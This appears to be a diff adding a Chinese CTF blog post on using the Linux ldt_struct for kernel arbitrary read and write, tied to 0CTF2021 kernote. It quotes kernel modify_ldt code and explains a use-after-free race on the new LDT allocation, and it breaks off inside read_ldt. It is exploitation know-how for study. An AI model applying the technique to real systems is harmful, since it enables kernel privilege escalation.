@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8" />
+        
+      <meta name="description" content="Boom? PWN ! ! !" />
+      
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>ldt_struct 任意地址读写&amp;&amp;0CTF2021-kernote |  北极落小雪</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+  </html>
+</html>
+
+
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-ldt_struct-arb_rw &amp;&amp; 0CTF2021-kernote"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  ldt_struct 任意地址读写&amp;&amp;0CTF2021-kernote
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2023/ldt_struct-arb_rw%20&&%200CTF2021-kernote/" class="article-date">
+  <time datetime="2023-12-26T16:00:00.000Z" itemprop="datePublished">2023-12-27</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Pwn/">Pwn</a> / <a class="article-category-link" href="/categories/Pwn/Kernel/">Kernel</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">3.2k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">16 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>稳定的任意读和不稳定的任意写</p>
+<span id="more"></span>
+<h2 id="ldt-struct-kmalloc-16-slub"><a href="#ldt-struct-kmalloc-16-slub" class="headerlink" title="ldt_struct  kmalloc-16(slub)"></a>ldt_struct  kmalloc-16(slub)</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MODIFY_LDT_SYSCALL</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ldt_structs can be allocated, used, and freed, but they are never</span></span><br><span class="line"><span class="comment"> * modified while live.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> {</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Xen requires page-aligned LDTs with special permissions.  This is</span></span><br><span class="line"><span class="comment">	 * needed to prevent us from installing evil descriptors such as</span></span><br><span class="line"><span class="comment">	 * call gates.  On native, we could merge the ldt_struct and LDT</span></span><br><span class="line"><span class="comment">	 * allocations, but it's not worth trying to optimize.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span>	*<span class="title">entries</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		nr_entries;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If PTI is in use, then the entries array is not mapped while we're</span></span><br><span class="line"><span class="comment">	 * in user mode.  The whole array will be aliased at the addressed</span></span><br><span class="line"><span class="comment">	 * given by ldt_slot_va(slot).  We use two slots so that we can allocate</span></span><br><span class="line"><span class="comment">	 * and map, and enable a new LDT without invalidating the mapping</span></span><br><span class="line"><span class="comment">	 * of an older, still-in-use LDT.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * slot will be -1 if this LDT doesn't have an alias mapping.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">int</span>			slot;</span><br><span class="line">};</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>用户可以通过modify_ldt来读写ldt.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(modify_ldt, <span class="type">int</span> , func , <span class="type">void</span> __user * , ptr ,</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">long</span> , bytecount)</span><br><span class="line">{</span><br><span class="line">	<span class="type">int</span> ret = -ENOSYS;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (func) {</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">		ret = read_ldt(ptr, bytecount);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">		ret = write_ldt(ptr, bytecount, <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">		ret = read_default_ldt(ptr, bytecount);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">		ret = write_ldt(ptr, bytecount, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	}</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The SYSCALL_DEFINE() macros give us an 'unsigned long'</span></span><br><span class="line"><span class="comment">	 * return type, but tht ABI for sys_modify_ldt() expects</span></span><br><span class="line"><span class="comment">	 * 'int'.  This cast gives us an int-sized value in %rax</span></span><br><span class="line"><span class="comment">	 * for the return code.  The 'unsigned' is necessary so</span></span><br><span class="line"><span class="comment">	 * the compiler does not try to sign-extend the negative</span></span><br><span class="line"><span class="comment">	 * return codes into the high half of the register when</span></span><br><span class="line"><span class="comment">	 * taking the value from int-&gt;long.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)ret;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<h2 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h2><p>write_ldt会为ldt新增一个desc_struct条目,不过需要重新分配一个ldt结构并将旧的拷贝过去.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">write_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount, <span class="type">int</span> oldmode)</span></span><br><span class="line">{</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>, *<span class="title">old_ldt</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> old_nr_entries, new_nr_entries;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">ldt_info</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> <span class="title">ldt</span>;</span></span><br><span class="line">	<span class="type">int</span> error;</span><br><span class="line"></span><br><span class="line">	error = -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (bytecount != <span class="keyword">sizeof</span>(ldt_info))</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	error = -EFAULT;</span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(&amp;ldt_info, ptr, <span class="keyword">sizeof</span>(ldt_info)))</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	error = -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (ldt_info.entry_number &gt;= LDT_ENTRIES)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	<span class="keyword">if</span> (ldt_info.contents == <span class="number">3</span>) {</span><br><span class="line">		<span class="keyword">if</span> (oldmode)</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		<span class="keyword">if</span> (ldt_info.seg_not_present == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((oldmode &amp;&amp; !ldt_info.base_addr &amp;&amp; !ldt_info.limit) ||</span><br><span class="line">	    LDT_empty(&amp;ldt_info)) {</span><br><span class="line">		<span class="comment">/* The user wants to clear the entry. */</span></span><br><span class="line">		<span class="built_in">memset</span>(&amp;ldt, <span class="number">0</span>, <span class="keyword">sizeof</span>(ldt));</span><br><span class="line">	} <span class="keyword">else</span> {</span><br><span class="line">		<span class="keyword">if</span> (!ldt_info.seg_32bit &amp;&amp; !allow_16bit_segments()) {</span><br><span class="line">			error = -EINVAL;</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		}</span><br><span class="line"></span><br><span class="line">		fill_ldt(&amp;ldt, &amp;ldt_info);</span><br><span class="line">		<span class="keyword">if</span> (oldmode)</span><br><span class="line">			ldt.avl = <span class="number">0</span>;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (down_write_killable(&amp;mm-&gt;context.ldt_usr_sem))</span><br><span class="line">		<span class="keyword">return</span> -EINTR;</span><br><span class="line"></span><br><span class="line">	old_ldt       = mm-&gt;context.ldt;</span><br><span class="line">	old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : <span class="number">0</span>;</span><br><span class="line">	new_nr_entries = max(ldt_info.entry_number + <span class="number">1</span>, old_nr_entries);</span><br><span class="line"></span><br><span class="line">	error = -ENOMEM;</span><br><span class="line">	new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line">	<span class="keyword">if</span> (!new_ldt)</span><br><span class="line">		<span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (old_ldt)</span><br><span class="line">		<span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">	new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br><span class="line">	finalize_ldt_struct(new_ldt);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If we are using PTI, map the new LDT into the userspace pagetables.</span></span><br><span class="line"><span class="comment">	 * If there is already an LDT, use the other slot so that other CPUs</span></span><br><span class="line"><span class="comment">	 * will continue to use the old LDT until install_ldt() switches</span></span><br><span class="line"><span class="comment">	 * them over to the new LDT.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	error = map_ldt_struct(mm, new_ldt, old_ldt ? !old_ldt-&gt;slot : <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (error) {</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * This only can fail for the first LDT setup. If an LDT is</span></span><br><span class="line"><span class="comment">		 * already installed then the PTE page is already</span></span><br><span class="line"><span class="comment">		 * populated. Mop up a half populated page table.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (!WARN_ON_ONCE(old_ldt))</span><br><span class="line">			free_ldt_pgtables(mm);</span><br><span class="line">		free_ldt_struct(new_ldt);</span><br><span class="line">		<span class="keyword">goto</span> out_unlock;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	install_ldt(mm, new_ldt);</span><br><span class="line">	unmap_ldt_struct(mm, old_ldt);</span><br><span class="line">	free_ldt_struct(old_ldt);</span><br><span class="line">	error = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">	up_write(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>来看关键部分:</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line"><span class="keyword">if</span> (!new_ldt)</span><br><span class="line">	<span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (old_ldt)</span><br><span class="line">	<span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>new_ldt来自GFP_KERNEL的kmalloc,可以通过uaf获得其的读写能力.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The caller must call finalize_ldt_struct on the result. LDT starts zeroed. */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> ldt_struct *<span class="title function_">alloc_ldt_struct</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_entries)</span></span><br><span class="line">{</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> alloc_size;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (num_entries &gt; LDT_ENTRIES)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	new_ldt = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ldt_struct), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!new_ldt)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	BUILD_BUG_ON(LDT_ENTRY_SIZE != <span class="keyword">sizeof</span>(<span class="keyword">struct</span> desc_struct));</span><br><span class="line">	alloc_size = num_entries * LDT_ENTRY_SIZE;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Xen is very picky: it requires a page-aligned LDT that has no</span></span><br><span class="line"><span class="comment">	 * trailing nonzero bytes in any page that contains LDT descriptors.</span></span><br><span class="line"><span class="comment">	 * Keep it simple: zero the whole allocation and never allocate less</span></span><br><span class="line"><span class="comment">	 * than PAGE_SIZE.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (alloc_size &gt; PAGE_SIZE)</span><br><span class="line">		new_ldt-&gt;entries = vzalloc(alloc_size);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		new_ldt-&gt;entries = (<span class="type">void</span> *)get_zeroed_page(GFP_KERNEL);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!new_ldt-&gt;entries) {</span><br><span class="line">		kfree(new_ldt);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* The new LDT isn't aliased for PTI yet. */</span></span><br><span class="line">	new_ldt-&gt;slot = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	new_ldt-&gt;nr_entries = num_entries;</span><br><span class="line">	<span class="keyword">return</span> new_ldt;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>在alloc_ldt_struct之后,memcpy和赋值语句的destination都是可以通过竞争写new_ldt来控制的,可以达到任意写的效果.<br>    对于memcpy来说,需要两次uaf,分别控制old_ldt和new_ldt.缺点是竞争窗口在alloc_ldt_struct之后,极短.<br>     对于赋值语句来说,只需控制new_ldt(ldt受来自user的ldt_info控制).缺点是由于一些检查and比较,ldt不完全可控,不过0是可以的.较大的old_nr_entries可以延长竞争窗口.<br>一般是用第二种</p>
+<p>(使用ldt_struct进行竞争任意写极不稳定,主要还是用来读)</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 8 byte segment descriptor */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> {</span></span><br><span class="line">	u16	limit0;</span><br><span class="line">	u16	base0;</span><br><span class="line">	u16	base1: <span class="number">8</span>, type: <span class="number">4</span>, s: <span class="number">1</span>, dpl: <span class="number">2</span>, p: <span class="number">1</span>;</span><br><span class="line">	u16	limit1: <span class="number">4</span>, avl: <span class="number">1</span>, l: <span class="number">1</span>, d: <span class="number">1</span>, g: <span class="number">1</span>, base2: <span class="number">8</span>;</span><br><span class="line">} __attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> {</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  entry_number;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  base_addr;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  limit;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  seg_32bit:<span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  contents:<span class="number">2</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  read_exec_only:<span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  limit_in_pages:<span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  seg_not_present:<span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  useable:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __x86_64__</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Because this bit is not present in 32-bit user code, user</span></span><br><span class="line"><span class="comment">	 * programs can pass uninitialized values here.  Therefore, in</span></span><br><span class="line"><span class="comment">	 * any context in which a user_desc comes from a 32-bit program,</span></span><br><span class="line"><span class="comment">	 * the kernel must act as though lm == 0, regardless of the</span></span><br><span class="line"><span class="comment">	 * actual value.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  lm:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>
+
+
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">fill_ldt</span><span class="params">(<span class="keyword">struct</span> desc_struct *desc, <span class="type">const</span> <span class="keyword">struct</span> user_desc *info)</span></span><br><span class="line">{</span><br><span class="line">	desc-&gt;limit0		= info-&gt;limit &amp; <span class="number">0x0ffff</span>;</span><br><span class="line"></span><br><span class="line">	desc-&gt;base0		= (info-&gt;base_addr &amp; <span class="number">0x0000ffff</span>);</span><br><span class="line">	desc-&gt;base1		= (info-&gt;base_addr &amp; <span class="number">0x00ff0000</span>) &gt;&gt; <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">	desc-&gt;type		= (info-&gt;read_exec_only ^ <span class="number">1</span>) &lt;&lt; <span class="number">1</span>;</span><br><span class="line">	desc-&gt;type	       |= info-&gt;contents &lt;&lt; <span class="number">2</span>;</span><br><span class="line">	<span class="comment">/* Set the ACCESS bit so it can be mapped RO */</span></span><br><span class="line">	desc-&gt;type	       |= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	desc-&gt;s			= <span class="number">1</span>;</span><br><span class="line">	desc-&gt;dpl		= <span class="number">0x3</span>;</span><br><span class="line">	desc-&gt;p			= info-&gt;seg_not_present ^ <span class="number">1</span>;</span><br><span class="line">	desc-&gt;limit1		= (info-&gt;limit &amp; <span class="number">0xf0000</span>) &gt;&gt; <span class="number">16</span>;</span><br><span class="line">	desc-&gt;avl		= info-&gt;useable;</span><br><span class="line">	desc-&gt;d			= info-&gt;seg_32bit;</span><br><span class="line">	desc-&gt;g			= info-&gt;limit_in_pages;</span><br><span class="line"></span><br><span class="line">	desc-&gt;base2		= (info-&gt;base_addr &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span>;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Don't allow setting of the lm bit. It would confuse</span></span><br><span class="line"><span class="comment">	 * user_64bit_mode and would get overridden by sysret anyway.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	desc-&gt;l			= <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="任意地址读"><a href="#任意地址读" class="headerlink" title="任意地址读"></a>任意地址读</h2><p>read_ldt可以读出ldt的中所有的desc_struct.<br>(<del>这是能允许user读的么…</del>)</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">read_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount)</span></span><br><span class="line">{</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> entries_size;</span><br><span class="line">	<span class="type">int</span> retval;</span><br><span class="line"></span><br><span class="line">	down_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!mm-&gt;context.ldt) {</span><br><span 